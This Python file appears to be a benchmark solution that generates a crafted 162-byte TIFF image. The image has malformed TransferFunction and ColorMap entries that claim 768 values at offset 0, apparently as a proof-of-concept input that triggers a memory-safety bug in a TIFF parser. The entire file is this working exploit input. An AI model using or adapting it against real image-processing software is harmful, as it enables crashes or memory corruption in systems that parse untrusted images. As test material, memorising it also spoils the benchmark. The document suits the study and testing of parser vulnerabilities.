import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        def pack_entry(tag, typ, count, value, inline=False):
            if inline:
                if typ == 3 and count == 1:  # SHORT
                    return struct.pack('<HHI', tag, typ, count) + struct.pack('<H', value) + b'\x00\x00'
                elif typ == 4 and count == 1:  # LONG
                    return struct.pack('<HHI', tag, typ, count) + struct.pack('<I', value)
                else:
                    # Fallback to offset (value used as offset)
                    return struct.pack('<HHI', tag, typ, count) + struct.pack('<I', value)
            else:
                # Treat value as offset
                return struct.pack('<HHI', tag, typ, count) + struct.pack('<I', value)

        data = bytearray()
        # TIFF little-endian header
        # Signature 'II', version 42 (0x2A), offset to first IFD = 8
        data += b'II*\x00' + struct.pack('<I', 8)

        # We will create 12 IFD entries
        num_entries = 12
        ifd_offset = 8
        ifd_size = 2 + num_entries * 12 + 4  # count + entries + next ifd offset
        pixel_offset = ifd_offset + ifd_size  # Data starts immediately after IFD
        # We want total size 162 bytes => pixel data length = 162 - pixel_offset
        pixel_len = 162 - pixel_offset
        if pixel_len < 1:
            pixel_len = 1  # ensure at least one byte
        # Build IFD
        data += struct.pack('<H', num_entries)

        # Entries (sorted by tag)
        # 254 NewSubfileType LONG 1 -> 0
        data += pack_entry(254, 4, 1, 0, inline=True)
        # 256 ImageWidth SHORT 1 -> 1
        data += pack_entry(256, 3, 1, 1, inline=True)
        # 257 ImageLength SHORT 1 -> 1
        data += pack_entry(257, 3, 1, 1, inline=True)
        # 258 BitsPerSample SHORT 1 -> 8 (inline)
        data += pack_entry(258, 3, 1, 8, inline=True)
        # 259 Compression SHORT 1 -> 1 (no compression)
        data += pack_entry(259, 3, 1, 1, inline=True)
        # 262 PhotometricInterpretation SHORT 1 -> 3 (palette color)
        data += pack_entry(262, 3, 1, 3, inline=True)
        # 273 StripOffsets LONG 1 -> pixel_offset (inline)
        data += pack_entry(273, 4, 1, pixel_offset, inline=True)
        # 277 SamplesPerPixel SHORT 1 -> 1
        data += pack_entry(277, 3, 1, 1, inline=True)
        # 278 RowsPerStrip SHORT 1 -> 1
        data += pack_entry(278, 3, 1, 1, inline=True)
        # 279 StripByteCounts LONG 1 -> pixel_len (inline)
        data += pack_entry(279, 4, 1, pixel_len, inline=True)
        # 301 TransferFunction SHORT count 768 -> offset 0 (offline with offset zero)
        data += pack_entry(301, 3, 768, 0, inline=False)
        # 320 ColorMap SHORT count 768 -> offset 0 (offline with offset zero)
        data += pack_entry(320, 3, 768, 0, inline=False)

        # Next IFD offset = 0
        data += struct.pack('<I', 0)

        # Ensure we are at the computed pixel offset
        if len(data) < pixel_offset:
            data += b'\x00' * (pixel_offset - len(data))

        # Pixel data
        data += b'\x00' * pixel_len

        # Ensure total length is 162 bytes
        if len(data) < 162:
            data += b'\x00' * (162 - len(data))
        elif len(data) > 162:
            data = data[:162]

        return bytes(data)